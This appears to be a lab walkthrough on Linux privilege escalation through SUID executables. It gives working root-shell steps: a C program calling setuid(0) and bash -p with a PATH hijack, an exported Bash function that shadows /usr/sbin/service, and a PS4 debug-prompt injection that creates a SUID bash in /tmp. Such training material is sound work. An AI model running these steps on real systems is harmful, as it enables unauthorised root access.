
Suppose we have a `/usr/local/bin/suid-env` SUID executable is vulnerable due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

```bash
/usr/local/bin/suid-env
```

Run strings on the file to look for strings of printable characters:

```bash
strings /usr/local/bin/suid-env
```

**One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.**

Compile this code into an executable called `service`. This code simply spawns a Bash shell.

Here is the code:

```c
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```

Compile it:

```bash
gcc -o service /home/user/tools/suid/service.c
```

Now we have to add the path of the `service` file to the `PATH` variable, for example if the file is at `/home/user` we run the following command:

```bash
PATH=/home/user:$PATH
```

Finally, we run the `suid-env` command:

```bash
/usr/local/bin/suid-env
```


### Abusing Shell Features: Method 1

What if the file uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Suppose the `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env`.

Verify this with strings:

```bash
strings /usr/local/bin/suid-env2
```

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

```bash
/bin/bash --version
```

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

```bash
function /usr/sbin/service { /bin/bash -p; }   export -f /usr/sbin/service
```

Run the suid-env2 executable to gain a root shell:

```bash
/usr/local/bin/suid-env2
```

The behavior is documented in [bash documentation command search and execution](https://www.gnu.org/software/bash/manual/bash.html#Command-Search-and-Execution). The behavior is standardized in [POSIX Shell command language, section Command search and execution](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_09_01_01).

### Abusing Shell Features: Method 2

**Note:** This method will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.

Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Now run it:

```bash
/tmp/rootbash -p
```